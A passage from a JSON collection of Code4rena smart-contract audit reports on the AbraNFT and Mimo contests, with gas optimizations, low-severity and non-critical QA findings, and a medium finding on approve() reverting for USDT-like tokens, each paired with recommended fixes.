    "body": "# Gas Optimizations\n## [G01] In `updateLoanParams()` change `memory` to `storage`:\ngas savings:\n- `28328` in `NFTPair` Deployments\n- `901` in `updateLoanParams()`\n### Recommended Mitigation Steps:\n```\nNFTPair.sol:182\n    - TokenLoan memory loan = tokenLoan[tokenId];\n    + TokenLoan storage loan = tokenLoan[tokenId];\n\nNFTPair.sol:187\n    - TokenLoanParams memory cur = tokenLoanParams[tokenId];\n    + TokenLoanParams storage cur = tokenLoanParams[tokenId];\n```\nDo same in `NFTPairWithOracle.sol`.\n\n## [G02] In `removeCollateral()` change `memory` to `storage` then cache `load.status`:\ngas savings:\n- `14068` in `NFTPair` Deployments\n- `284` in `removeCollateral()`\n### Recommended Mitigation Steps:\nchange:\n```solidity\nfunction removeCollateral(uint256 tokenId, address to) public {\n    TokenLoan memory loan = tokenLoan[tokenId];\n    if (loan.status == LOAN_REQUESTED) {\n        // We are withdrawing collateral that is not in use:\n        require(msg.sender == loan.borrower, \"NFTPair: not the borrower\");\n    } else if (loan.status == LOAN_OUTSTANDING) {\n        // We are seizing collateral as the lender. The loan has to be\n        // expired and not paid off:\n        require(to == loan.lender, \"NFTPair: not the lender\");\n        require(\n            // Addition is safe: both summands are smaller than 256 bits\n            uint256(loan.startTime) + tokenLoanParams[tokenId].duration <= block.timestamp,\n            \"NFTPair: not expired\"\n        );\n    }\n    // If there somehow is collateral but no accompanying loan, then anyone\n    // can claim it by first requesting a loan with `skim` set to true, and\n    // then withdrawing. So we might as well allow it here..\n    delete tokenLoan[tokenId];\n    collateral.transferFrom(address(this), to, tokenId);\n    emit LogRemoveCollateral(tokenId, to);\n}\n```\nto:\n```solidity\nfunction removeCollateral(uint256 tokenId, address to) public {\n    TokenLoan storage loan = tokenLoan[tokenId];\n    uint8 loanStatus = loan.status;\n    if (loanStatus == LOAN_REQUESTED) {\n        // We are withdrawing collateral that is not in use:\n        require(msg.sender == loan.borrower, \"NFTPair: not the borrower\");\n    } else if (loanStatus == LOAN_OUTSTANDING) {\n        // We are seizing collateral as the lender. The loan has to be\n        // expired and not paid off:\n        require(to == loan.lender, \"NFTPair: not the lender\");\n        require(\n            // Addition is safe: both summands are smaller than 256 bits\n            uint256(loan.startTime) + tokenLoanParams[tokenId].duration <= block.timestamp,\n            \"NFTPair: not expired\"\n        );\n    }\n    // If there somehow is collateral but no accompanying loan, then anyone\n    // can claim it by first requesting a loan with `skim` set to true, and\n    // then withdrawing. So we might as well allow it here..\n    delete tokenLoan[tokenId];\n    collateral.transferFrom(address(this), to, tokenId);\n    emit LogRemoveCollateral(tokenId, to);\n}\n```\nDo same in `NFTPairWithOracle.sol`.\n\n## [G03] In `_lend()` save `SLOAD` by caching `asset`:\ngas savings:\n- `1320` in `NFTPair` Deployments\n- `205` in `lend()`\n- `210` in `requestAndBorrow()`\n- `204` in `takeCollateralAndLend()`\n### Recommended Mitigation Steps:\n```\n+ IERC20 assetCache = asset;\n```\nchange `asset`s with `assetCache`\n\nDo same in `NFTPairWithOracle.sol`.\n\n## [G04] In `repay()` save `SLOAD` by caching `asset`:\ngas savings:\n- `420` in `NFTPair` Deployments\n- `304` in `repay()`\n### Recommended Mitigation Steps:\n```\n+ IERC20 assetCache = asset;\n```\nchange `asset`s with `assetCache`\n\nDo same in `NFTPairWithOracle.sol`.\n",
    "dataSource": {
      "name": "code-423n4/2022-04-abranft-findings",
      "repo": "https://github.com/code-423n4/2022-04-abranft-findings",
      "url": "https://github.com/code-423n4/2022-04-abranft-findings/issues/160"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low\n\n### `init` of the master contract can be called by anyone\nWhile there seems to be no exploit, we can set collateral to a non-zero value in constructor to reduce risk.\nhttps://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L175\n\n### Lack non-zero check of `asset`\nhttps://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L175-L179\n```\n    function init(bytes calldata data) public payable override {\n        require(address(collateral) == address(0), \"NFTPair: already initialized\");\n        (collateral, asset) = abi.decode(data, (IERC721, IERC20));\n        require(address(collateral) != address(0), \"NFTPair: bad pair\");\n    }\n```\n\n### Collateral can be stuck if the to address not support ERC721\nhttps://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L266-L266\n\n```solidity\n        collateral.transferFrom(address(this), to, tokenId);\n```\n\n## Non-Critical\n\n### Upgrade Solidity Version\nConsider to pin Solidity version to latest 0.8.12\n\n### Revert without reason\nhttps://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L501",
    "dataSource": {
      "name": "code-423n4/2022-04-abranft-findings",
      "repo": "https://github.com/code-423n4/2022-04-abranft-findings",
      "url": "https://github.com/code-423n4/2022-04-abranft-findings/issues/149"
    }
  },
  {
    "title": "QA Report",
    "body": "- [[L-01] Immutable addresses should be 0-checked](#l-01-immutable-addresses-should-be-0-checked)\n- [[L-02] Prevent accidentally burning tokens](#l-02-prevent-accidentally-burning-tokens)\n- [[L-03] Use of `ecrecover` is susceptible to signature malleability](#l-03-use-of-ecrecover-is-susceptible-to-signature-malleability)\n\n## [L-01] Immutable addresses should be 0-checked\n\nConsider adding an `address(0)` check here:\n\n```solidity\n186:     constructor(IBentoBoxV1 bentoBox_) public {\n187:         bentoBox = bentoBox_; //@audit missing address(0) check \n188:         masterContract = this;\n189:     }\n```\n\n## [L-02] Prevent accidentally burning tokens\n\nTransferring tokens to the zero address is usually prohibited to accidentally avoid \"burning\" tokens by sending them to an unrecoverable zero address.\n\nConsider adding a check to prevent accidentally burning tokens here:\n\n```solidity\n668:             } else if (action == ACTION_BENTO_TRANSFER) {\n669:                 (IERC20 token, address to, int256 share) = abi.decode(datas[i], (IERC20, address, int256));\n670:                 bentoBox.transfer(token, msg.sender, to, _num(share, value1, value2));\n```\n\n## [L-03] Use of `ecrecover` is susceptible to signature malleability\n\nThe `ecrecover` function is used to verify and execute Meta transactions. The built-in EVM precompile `ecrecover` is susceptible to signature malleability (because of non-unique s and v values) which could lead to replay attacks.\n\nConsider using [OpenZeppelin’s ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol)\n",
    "dataSource": {
      "name": "code-423n4/2022-04-abranft-findings",
      "repo": "https://github.com/code-423n4/2022-04-abranft-findings",
      "url": "https://github.com/code-423n4/2022-04-abranft-findings/issues/137"
    }
  },
  {
    "title": "QA Report",
    "body": "### 1. SuperVault uses unchecked collateral transfer and transferFrom with arbitrary ERC20 (low)\n\nWhenever an ERC20 that do not revert on transfer failure is used and transfer / transferFrom fails and return false which will be ignored, there will be a contract malfunction, the end result of which depends on the current state of the contract.\n\nPlacing severity to be low for 3 functions that are onlyOwner as in such case the behavior can be controlled by the trusted caller.\n\n## Proof of Concept\n\nleverage (onlyOwner):\n\nhttps://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/supervaults/contracts/SuperVault.sol#L129-L129\n\n```solidity\nIERC20(asset).transferFrom(msg.sender, address(this), depositAmount);\n```\n\nemptyVault (onlyOwner):\n\nhttps://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/supervaults/contracts/SuperVault.sol#L237-L237\n\n```solidity\ncollateral.transfer(msg.sender, collateral.balanceOf(address(this)));\n```\n\ndepositAndBorrowFromVault (onlyOwner):\n\nhttps://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/supervaults/contracts/SuperVault.sol#L290-L290\n\n```solidity\ntoken.transferFrom(msg.sender, address(this), depositAmount);\n```\n\nSome ERC20 do not revert on transfer failure:\n\nhttps://github.com/d-xo/weird-erc20#no-revert-on-failure\n\n## Recommended Mitigation Steps\n\nRequire transfer success as it is done elsewhere in the contract or employ OpenZeppelin's SafeERC20\n\n### 2. PARMinerV2's liquidate doesn't check the router call success (non-critical)\n\nOn router call failure there will be LM104 error issued, which might not be best for failure description.\n\n## Proof of Concept\n\nrouter can be arbitrary and router.call is unchecked:\n\nhttps://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/core/contracts/liquidityMining/v2/PARMinerV2.sol#L126-L128\n\n```solidity\n    router.call(dexTxData);\n    _par.safeTransfer(msg.sender, _liquidateCallerReward);\n    require(_par.balanceOf(address(this)) > parBalanceBefore, \"LM104\");\n```\n\n## Recommended Mitigation Steps\n\nRequiring the call success is advised with a tailored error\n\n### 3. Manual updateBoost is required before GenericMinerV2 become operational (non-critical)\n\nreleaseRewards calls _releaseRewards before _updateBoost:\n\nhttps://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/core/contracts/liquidityMining/v2/GenericMinerV2.sol#L80-L86\n\n```solidity\n  function releaseRewards(address _user) public virtual override {\n    UserInfo memory _userInfo = _users[_user];\n    _releaseRewards(_user, _userInfo);\n    _userInfo.accAmountPerShare = _accMimoAmountPerShare;\n    _userInfo.accParAmountPerShare = _accParAmountPerShare;\n    _updateBoost(_user, _userInfo);\n  }\n```\n\nAs only _updateBoost can increase _totalStakeWithBoost, the _releaseRewards() will fail by calling _refresh():\n\nhttps://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/core/contracts/liquidityMining/v2/GenericMinerV2.sol#L209-L212\n\n```solidity\n  function _releaseRewards(address _user, UserInfo memory _userInfo) internal {\n    uint256 pendingMIMO = _pendingMIMO(_userInfo.stakeWithBoost, _userInfo.accAmountPerShare);\n    uint256 pendingPAR = _pendingPAR(_userInfo.stakeWithBoost, _userInfo.accParAmountPerShare);\n    _refresh();\n```\n\nThis is because _refresh() performs division by _totalStakeWithBoost without checking that it is non-zero:\n\nhttps://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/core/contracts/liquidityMining/v2/GenericMinerV2.sol#L271-L273\n\n```solidity\n    _accMimoAmountPerShare = _accMimoAmountPerShare.add(mimoReward.rayDiv(_totalStakeWithBoost));\n    _parBalanceTracker = currentParBalance;\n    _accParAmountPerShare = _accParAmountPerShare.add(parReward.rayDiv(_totalStakeWithBoost));\n```\n\nWhile it will be zero on releaseRewards or _updateStake first run as _totalStakeWithBoost wasn't updated yet.\n\n\n## Recommended Mitigation Steps\n\nConsider checking that _totalStakeWithBoost is not zero before running the logic that use it as a divisor.",
    "dataSource": {
      "name": "code-423n4/2022-04-mimo-findings",
      "repo": "https://github.com/code-423n4/2022-04-mimo-findings",
      "url": "https://github.com/code-423n4/2022-04-mimo-findings/issues/165"
    }
  },
  {
    "title": "QA Report",
    "body": "**Table of Contents:**\n\n- [[L-01] `approve` should be replaced with `safeApprove` or `safeIncreaseAllowance() / safeDecreaseAllowance()`](#l-01-approve-should-be-replaced-with-safeapprove-or-safeincreaseallowance--safedecreaseallowance)\n- [[L-02] Add constructor initializers](#l-02-add-constructor-initializers)\n- [[L-03] Missing address(0) checks](#l-03-missing-address0-checks)\n- [[L-04] Add a timelock and event to critical functions](#l-04-add-a-timelock-and-event-to-critical-functions)\n- [[L-05] Fee in `DemandMinerV2.setFeeConfig()` should be upper-bounded](#l-05-fee-in-demandminerv2setfeeconfig-should-be-upper-bounded)\n- [[N-01] Unused named returns](#n-01-unused-named-returns)\n- [[N-02] Useless import: SafeMath](#n-02-useless-import-safemath)\n- [[N-03] The visibility for constructor is ignored](#n-03-the-visibility-for-constructor-is-ignored)\n\n## [L-01] `approve` should be replaced with `safeApprove` or `safeIncreaseAllowance() / safeDecreaseAllowance()`\n\n`approve` is subject to a known front-running attack. Consider using `safeApprove` instead:\n\n```solidity\ncore/contracts/liquidityMining/v2/PARMinerV2.sol:\n   58:     _par.approve(address(_a.parallel().core()), uint256(-1));\n  125:     collateralToken.approve(proxy, collateralToken.balanceOf(address(this)));\n\ncore/echidna/TInceptionVaultHealthy.sol:\n  33:     _weth.approve(address(a), _adminDepositAmount);\n  39:     _link.approve(address(v), _userDepositAmount);\n  47:     _par.approve(address(_inceptionVaultsCore), _MAX_INT);\n\ncore/echidna/TInceptionVaultUnhealthy.sol:\n  37:     _weth.approve(address(a), _adminDepositAmount);\n  43:     _link.approve(address(v), _userDepositAmount);\n  52:     _par.approve(address(_inceptionVaultsCore), _MAX_INT);\n\ncore/echidna/TInceptionVaultUnhealthyAssertion.sol:\n  36:     _weth.approve(address(a), _adminDepositAmount);\n  42:     _link.approve(address(v), _userDepositAmount);\n  51:     _par.approve(address(_inceptionVaultsCore), _MAX_INT);\n\ncore/echidna/TInceptionVaultUnhealthyProperty.sol:\n  35:     _weth.approve(address(a), _adminDepositAmount);\n  41:     _link.approve(address(v), _userDepositAmount);\n  50:     _par.approve(address(_inceptionVaultsCore), _MAX_INT);\n\nsupervaults/contracts/SuperVault.sol:\n   97:     asset.approve(address(lendingPool), flashloanRepayAmount);\n  149:     IERC20(toCollateral).approve(address(a.core()), depositAmount);\n  199:     par.approve(address(a.core()), par.balanceOf(address(this)));\n  273:     token.approve(address(a.core()), amount);\n  289:     token.approve(address(a.core()), depositAmount);\n  326:     token.approve(address(a.core()), 2**256 - 1);\n  345:     token.approve(proxy, amount);\n```\n\nKeep in mind though that it would be actually better to replace safeApprove() with safeIncreaseAllowance() or safeDecreaseAllowance().\n\nSee this discussion: [SafeERC20.safeApprove() Has unnecessary and unsecure added behavior](https://github.com/OpenZeppelin/openzeppelin-contracts/issues/2219)\n\n## [L-02] Add constructor initializers\n\nAs per [OpenZeppelin’s (OZ) recommendation](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/6), “The guidelines are now to make it impossible for *anyone* to run `initialize` on an implementation contract, by adding an empty constructor with the `initializer` modifier. So the implementation contract gets initialized automatically upon deployment.”\n\nNote that this behaviour is also incorporated the [OZ Wizard](https://wizard.openzeppelin.com/) since the UUPS vulnerability discovery: “Additionally, we modified the code generated by the [Wizard 19](https://wizard.openzeppelin.com/) to include a constructor that automatically initializes the implementation when deployed.”\n\nFurthermore, this thwarts any attempts to frontrun the initialization tx of these contracts:\n\n```solidity\ncore/contracts/inception/AdminInceptionVault.sol:\n  35:   function initialize(\n\ncore/contracts/inception/InceptionVaultsCore.sol:\n  40:   function initialize(\n\ncore/contracts/inception/InceptionVaultsDataProvider.sol:\n  30:   function initialize(IInceptionVaultsCore inceptionVaultsCore, IAddressProvider addressProvider)\n\ncore/contracts/inception/priceFeed/ChainlinkInceptionPriceFeed.sol:\n  29:   function initialize(\n\nsupervaults/contracts/SuperVault.sol:\n  49:   function initialize(\n```\n\n## [L-03] Missing address(0) checks\n\nAccording to Slither:\n\n```solidity\nAdminInceptionVault.initialize(address,IAddressProvider,IDebtNotifier,IWETH,IERC20,IInceptionVaultsCore)._owner (contracts/inception/AdminInceptionVault.sol#36) lacks a zero-check on :\n  - owner = _owner (contracts/inception/AdminInceptionVault.sol#48)\nInceptionVaultsCore.initialize(address,IInceptionVaultsCore.VaultConfig,IERC20,IAddressProvider,IAdminInceptionVault,IInceptionVaultsDataProvider,IInceptionVaultPriceFeed)._owner (contracts/inception/InceptionVaultsCore.sol#41) lacks a zero-check on :\n  - owner = _owner (contracts/inception/InceptionVaultsCore.sol#56)\nDemandMinerV2.setFeeCollector(address).feeCollector (contracts/liquidityMining/v2/DemandMinerV2.sol#46) lacks a zero-check on :\n  - _feeCollector = feeCollector (contracts/liquidityMining/v2/DemandMinerV2.sol#47)\nPARMinerV2.liquidate(uint256,uint256,uint256,bytes).router (contracts/liquidityMining/v2/PARMinerV2.sol#124) lacks a zero-check on :\n  - router.call(dexTxData) (contracts/liquidityMining/v2/PARMinerV2.sol#126)\n```\n\n## [L-04] Add a timelock to critical functions\n\nIt is a good practice to give time for users to react and adjust to critical changes. A timelock provides more guarantees and reduces the level of trust required, thus decreasing risk for users. It also indicates that the project is legitimate (less risk of a malicious Manager making a frontrunning/sandwich attack on the fees).\n\nConsider adding a timelock to:\n\n```solidity\nFile: DemandMinerV2.sol\n56:   function setFeeConfig(FeeConfig memory newFeeConfig) external override onlyManager {\n57:     _feeConfig = newFeeConfig;\n58:     emit FeeConfigSet(newFeeConfig);\n59:   }\n```\n\n## [L-05] Fee in `DemandMinerV2.setFeeConfig()` should be upper-bounded\n\n```solidity\nFile: DemandMinerV2.sol\n56:   function setFeeConfig(FeeConfig memory newFeeConfig) external override onlyManager {\n57:     _feeConfig = newFeeConfig;\n58:     emit FeeConfigSet(newFeeConfig);\n59:   }\n```\n\n## [N-01] Unused named returns\n\nUsing both named returns and a return statement isn't necessary. Removing one of those can improve code clarity:\n\n```solidity\ncore/contracts/inception/priceFeed/ChainlinkInceptionPriceFeed.sol:\n  73:   function getAssetPrice() public view override returns (uint256 price) {\n```\n\n## [N-02] Useless import: SafeMath\n\n```solidity\nFile: SuperVault.sol\n6: import \"@openzeppelin/contracts/utils/math/SafeMath.sol\"; //@audit NC: useless import\n```\n\n## [N-03] The visibility for constructor is ignored\n\n```solidity\nFile: SuperVaultFactory.sol\n17:   constructor(address _base) public {\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-04-mimo-findings",
      "repo": "https://github.com/code-423n4/2022-04-mimo-findings",
      "url": "https://github.com/code-423n4/2022-04-mimo-findings/issues/153"
    }
  },
  {
    "title": "SuperVault's leverageSwap and emptyVaultOperation can become stuck",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/supervaults/contracts/SuperVault.sol#L320-L326\nhttps://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/supervaults/contracts/SuperVault.sol#L198-L199\n\n\n# Vulnerability details\n\n\t\n\nleverageSwap and emptyVaultOperation can be run repeatedly for the same tokens. If these tokens happen to be an ERC20 that do not allow for approval of positive amount when allowance already positive, both functions can become stuck.\n\nhttps://github.com/d-xo/weird-erc20#approval-race-protections\n\nIn both cases logic doesn't seem to guarantee full usage of the allowance given. If it's not used fully, the token will revert each next approve attempt, which will render the functions unavailable for the token.\n\nWhile emptyVaultOperation can be cured by emptying the balance and rerun, in the leverageSwap case there is no such fix possible.\n\nSetting severity to medium as this clearly impacts leverageSwap and emptyVaultOperation availability to the users.\n\n## Proof of Concept\n\nleverageSwap calls target token for maximum approval of core each time:\n\nhttps://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/supervaults/contracts/SuperVault.sol#L320-L326\n\n```solidity\n  ///@param token The leveraged asset to swap PAR for\n  function leverageSwap(bytes memory params, IERC20 token) internal {\n    (uint256 parToSell, bytes memory dexTxData, uint dexIndex) = abi.decode(\n      params,\n      (uint256, bytes, uint )\n    );\n    token.approve(address(a.core()), 2**256 - 1);\n```\n\nSome tokens do not have maximum amount as an exception, simply reverting any attempt to approve positive from positive, for example current USDT contract, L205:\n\nhttps://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#code\n\nI.e. if leverageSwap be run again with USDT it will revert all the times after the first.\n\nemptyVaultOperation approves core for the whole balance of stablex:\n\nhttps://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/supervaults/contracts/SuperVault.sol#L198-L199\n\n```solidity\n    IERC20 par = IERC20(a.stablex());\n    par.approve(address(a.core()), par.balanceOf(address(this)));\n```\n\n## Recommended Mitigation Steps\n\nConsider adding zero amount approval before actual amount approval, i.e. force zero allowance before current approval.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-mimo-findings",
      "repo": "https://github.com/code-423n4/2022-04-mimo-findings",
      "url": "https://github.com/code-423n4/2022-04-mimo-findings/issues/145"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "**Table of Contents:**\n\n- [Help the optimizer by saving a storage variable's reference instead of repeatedly fetching it](#help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it)\n- [Caching external values in memory](#caching-external-values-in-memory)\n- [Using an existing memory variable instead of reading storage](#using-an-existing-memory-variable-instead-of-reading-storage)\n- [`BalancerV2LPOracle.sol`: Tighly pack storage variables](#balancerv2lporaclesol-tighly-pack-storage-variables)\n- [Variables that should be constant](#variables-that-should-be-constant)\n- [`> 0` is less efficient than `!= 0` for unsigned integers (with proof)](#-0-is-less-efficient-than--0-for-unsigned-integers-with-proof)\n- [`<=` is cheaper than `<`](#-is-cheaper-than-)\n- [Splitting `require()` statements that use `&&` saves gas](#splitting-require-statements-that-use--saves-gas)\n- [`require()` should be used for checking error conditions on inputs and return values while `assert()` should be used for invariant checking](#require-should-be-used-for-checking-error-conditions-on-inputs-and-return-values-while-assert-should-be-used-for-invariant-checking)\n- [Amounts should be checked for 0 before calling a transfer](#amounts-should-be-checked-for-0-before-calling-a-transfer)\n- [An array's length should be cached to save gas in for-loops](#an-arrays-length-should-be-cached-to-save-gas-in-for-loops)\n- [`++i` costs less gas compared to `i++` or `i += 1`](#i-costs-less-gas-compared-to-i-or-i--1)\n- [Usage of a non-native 256 bits uint as a counter in for-loops increases gas cost](#usage-of-a-non-native-256-bits-uint-as-a-counter-in-for-loops-increases-gas-cost)\n- [Public functions to external](#public-functions-to-external)\n- [No need to explicitly initialize variables with default values](#no-need-to-explicitly-initialize-variables-with-default-values)\n- [Use Custom Errors instead of Revert Strings to save Gas](#use-custom-errors-instead-of-revert-strings-to-save-gas)\n\n## Help the optimizer by saving a storage variable's reference instead of repeatedly fetching it\n\nTo help the optimizer, declare a `storage` type variable and use it instead of repeatedly fetching the reference in a map or an array.\n\nThe effect can be quite significant.\n\nAs an example, instead of repeatedly calling `someMap[someIndex]`, save its reference like this: `SomeStruct storage someStruct = someMap[someIndex]` and use it.\n\nInstances include (check the `@audit` tags):\n\n```solidity\ncore/contracts/dex/DexAddressProvider.sol:\n  53:     return (_dexMapping[index].proxy, _dexMapping[index].router);  //@audit gas: should declare a storage variable \"Dex storage _dex = _dexMapping[index]\"\n```\n\n## Caching external values in memory\n\nSee the `@audit` tags for further details:\n\n```solidity\ncore/contracts/dex/DexAddressProvider.sol:\n  22:     require(_a.controller().hasRole(_a.controller().MANAGER_ROLE(), msg.sender), \"LM010\"); //@audit gas: should cache _a.controller()\n\nsupervaults/contracts/SuperVault.sol:\n  369:     if (ga.mimo().balanceOf(address(this)) > 0) {  //@audit gas: should cache ga.mimo()\n```\n\n## Using an existing memory variable instead of reading storage\n\nSee the `@audit` tags for further details:\n\n```solidity\ncore/contracts/oracles/BalancerV2LPOracle.sol:\n  41:     (address _pool, IBalancerVault.PoolSpecialization tokensNum) = vault.getPool(poolId); //@audit gas: should use memory variable _poolId: \"vault.getPool(_poolId)\"\n```\n\n## `BalancerV2LPOracle.sol`: Tighly pack storage variables\n\nI suggest going from (see `@audit` tags):\n\n```solidity\nFile: BalancerV2LPOracle.sol\n14: contract BalancerV2LPOracle is AggregatorV3Interface, BNum {\n15:   using SafeMath for uint256;\n16: \n17:   string public override description; //@audit gas: 32 bytes\n18:   uint256 public override version = 3; //@audit gas: 32 bytes\n19:   uint8 public override decimals; //@audit gas: 1 byte, can be tightly packed by being moved further down or by moving an address closer\n20: \n21:   bytes32 public poolId; //@audit gas: 32 bytes\n22:   IBalancerVault public vault; //@audit gas: 20 bytes\n23:   IBalancerPool public pool; //@audit gas: 20 bytes\n24:   AggregatorV3Interface public oracleA; //@audit gas: 20 bytes\n25:   AggregatorV3Interface public oracleB; //@audit gas: 20 bytes\n```\n\nto\n\n```solidity\ncontract BalancerV2LPOracle is AggregatorV3Interface, BNum {\n  using SafeMath for uint256;\n\n  string public override description; //@audit gas: 32 bytes (slot 1)\n  uint256 public override version = 3; //@audit gas: 32 bytes (slot 2)\n  uint8 public override decimals; //@audit gas: 1 byte (slot 3)\n\n  IBalancerVault public vault; //@audit gas: 20 bytes (slot 3)\n  IBalancerPool public pool; //@audit gas: 20 bytes  (slot 4)\n  bytes32 public poolId; //@audit gas: 32 bytes <= this is the one we moved\n  AggregatorV3Interface public oracleA; //@audit gas: 20 bytes\n  AggregatorV3Interface public oracleB; //@audit gas: 20 bytes\n```\n\nWhich would save 1 storage slot.\n\n## Variables that should be constant\n\nAccording to slither:\n\n```jsx\nBalancerV2LPOracle.version (contracts/oracles/BalancerV2LPOracle.sol#18) should be constant\nGUniLPOracle.version (contracts/oracles/GUniLPOracle.sol#16) should be constant\n```\n\n## `> 0` is less efficient than `!= 0` for unsigned integers (with proof)\n\n`!= 0` costs less gas compared to `> 0` for unsigned integers in `require` statements with the optimizer enabled (6 gas)\n\nProof: While it may seem that `> 0` is cheaper than `!=`, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you're in a `require` statement, this will save gas. You can see this tweet for more proofs: <https://twitter.com/gzeon/status/1485428085885640706>\n\nI suggest changing `> 0` with `!= 0` here:\n\n```solidity\ncore/contracts/inception/InceptionVaultsCore.sol:122:    require(_amount > 0, \"IV100\");\ncore/contracts/liquidityMining/v2/GenericMinerV2.sol:58:    require(boostConfig.a >= 1 && boostConfig.d > 0 && boostConfig.maxBoost >= 1, \"LM004\");\ncore/contracts/liquidityMining/v2/GenericMinerV2.sol:70:    require(newBoostConfig.a >= 1 && newBoostConfig.d > 0 && newBoostConfig.maxBoost >= 1, \"LM004\");\ncore/contracts/liquidityMining/v2/GenericMinerV2.sol:175:    require(value > 0, \"LM101\");\ncore/contracts/liquidityMining/v2/GenericMinerV2.sol:195:    require(value > 0, \"LM101\");\ncore/contracts/liquidityMining/v2/PARMinerV2.sol:52:    require(boostConfig.a >= 1 && boostConfig.d > 0 && boostConfig.maxBoost >= 1, \"LM004\");\ncore/contracts/liquidityMining/v2/PARMinerV2.sol:71:    require(newBoostConfig.a >= 1 && newBoostConfig.d > 0 && newBoostConfig.maxBoost >= 1, \"LM004\");\ncore/contracts/liquidityMining/v2/PARMinerV2.sol:254:    require(_value > 0, \"LM101\");\ncore/contracts/liquidityMining/v2/PARMinerV2.sol:284:    require(_value > 0, \"LM101\");\ncore/contracts/oracles/GUniLPOracle.sol:112:    require(rA > 0 || rB > 0, \"C100\");\n```\n\nAlso, please enable the Optimizer.\n\n## `<=` is cheaper than `<`\n\nStrict inequalities (`<`) are more expensive than non-strict ones (`<=`). This is due to some supplementary checks (ISZERO, 3 gas)  \n\nI suggest using  `<=`  instead of `<` here:\n\n```solidity\ncore/contracts/libraries/ABDKMath64x64.sol:697:      return uint128(r < r1 ? r : r1);\n```\n\n## Splitting `require()` statements that use `&&` saves gas\n\nInstead of using the `&&` operator in a single require statement to check multiple conditions, I suggest using multiple require statements with 1 condition per require statement (saving 3 gas per `&`):\n\n```solidity\ncore/contracts/libraries/ABDKMath64x64.sol:\n   35:     require(x >= -0x8000000000000000 && x <= 0x7FFFFFFFFFFFFFFF);\n   83:     require(result >= MIN_64x64 && result <= MAX_64x64);\n  107:     require(result >= MIN_64x64 && result <= MAX_64x64);\n  120:     require(result >= MIN_64x64 && result <= MAX_64x64);\n  133:     require(result >= MIN_64x64 && result <= MAX_64x64);\n  207:     require(result >= MIN_64x64 && result <= MAX_64x64);\n  288:     require(result >= MIN_64x64 && result <= MAX_64x64);\n  413:     require(result >= MIN_64x64 && result <= MAX_64x64);\n\ncore/contracts/liquidityMining/v2/GenericMinerV2.sol:\n   58:     require(boostConfig.a >= 1 && boostConfig.d > 0 && boostConfig.maxBoost >= 1, \"LM004\");\n   70:     require(newBoostConfig.a >= 1 && newBoostConfig.d > 0 && newBoostConfig.maxBoost >= 1, \"LM004\");\n  331:     require(multiplier >= 1e18 && multiplier <= _boostConfig.maxBoost, \"LM103\");\n\ncore/contracts/liquidityMining/v2/PARMinerV2.sol:\n   52:     require(boostConfig.a >= 1 && boostConfig.d > 0 && boostConfig.maxBoost >= 1, \"LM004\");\n   71:     require(newBoostConfig.a >= 1 && newBoostConfig.d > 0 && newBoostConfig.maxBoost >= 1, \"LM004\");\n  426:     require(multiplier >= 1e18 && multiplier <= _boostConfig.maxBoost, \"LM103\");\n\nsupervaults/contracts/SuperVault.sol:\n  344:     require(proxy != address(0) && router != address(0), \"SV201\"); \n```\n\n## `require()` should be used for checking error conditions on inputs and return values while `assert()` should be used for invariant checking\n\nProperly functioning code should **never** reach a failing assert statement, unless there is a bug in your contract you should fix. Here, I believe the assert should be a require or a revert:\n\n```solidity\ncore/contracts/libraries/ABDKMath64x64.sol:641:      assert(xh == hi >> 128);\n```\n\nAs the Solidity version is `0.6.12 < 0.8.0`, the remaining gas would not be refunded in case of failure.\n\n## Amounts should be checked for 0 before calling a transfer\n\nChecking non-zero transfer values can avoid an expensive external call and save gas.  \n\nWhile this is done at some places, it's not consistently done in the solution.\n\nI suggest adding a non-zero-value check here:\n\n```solidity  \ncore/contracts/inception/AdminInceptionVault.sol:81:    asset.safeTransferFrom(msg.sender, address(this), _depositAmount);\ncore/contracts/inception/AdminInceptionVault.sol:101:    asset.safeTransfer(msg.sender, _amount);\ncore/contracts/inception/AdminInceptionVault.sol:124:    stablex.safeTransfer(_to, _amount);\ncore/contracts/inception/AdminInceptionVault.sol:131:    _mimo.safeTransfer(_to, _amount);\ncore/contracts/inception/AdminInceptionVault.sol:139:    par.safeTransfer(_to, _amount);\ncore/contracts/inception/AdminInceptionVault.sol:145:    this function uses `transferFrom()` and requires pre-approval via `approve()` on the ERC20.\ncore/contracts/inception/AdminInceptionVault.sol:151:    asset.safeTransferFrom(msg.sender, address(this), 